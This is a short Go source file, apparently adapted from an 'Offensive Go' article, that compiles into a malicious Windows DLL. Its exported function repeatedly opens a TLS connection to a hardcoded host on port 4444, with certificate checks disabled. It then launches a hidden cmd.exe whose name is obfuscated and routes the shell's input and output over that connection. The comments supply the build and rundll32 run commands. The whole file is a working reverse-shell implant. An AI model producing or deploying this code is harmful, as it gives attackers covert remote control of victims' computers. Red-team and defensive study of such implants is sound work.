package main

//from https://medium.com/geekculture/offensive-go-creating-malicious-dlls-8c797bcdd290
// GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o tacos.dll ./cmd/tacosdll/tacosdll.go
// Run: rundll32.exe ./tacos.dll,Tacos

import (
	"crypto/tls"
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

import "C"

//export Tacos
func Tacos() {

	for {
		conf := &tls.Config{
			InsecureSkipVerify: true,
		}
		time.Sleep(15 * time.Second)

		conn, err := tls.Dial("tcp", "172.23.110.155:4444", conf) //CHANGE IP, TODO: as a parameter for the dll fucntion

		if err != nil {
			continue
		}

		// cmd := exec.Command("powershell.exe")
		cmd := exec.Command(strings.ToLower(fmt.Sprintf("%s%s", "Cm", "D.exE")))

		// hides PowerShell window after command execution
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}

		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
	}
}

// main is required in order for compilation
func main() {
}
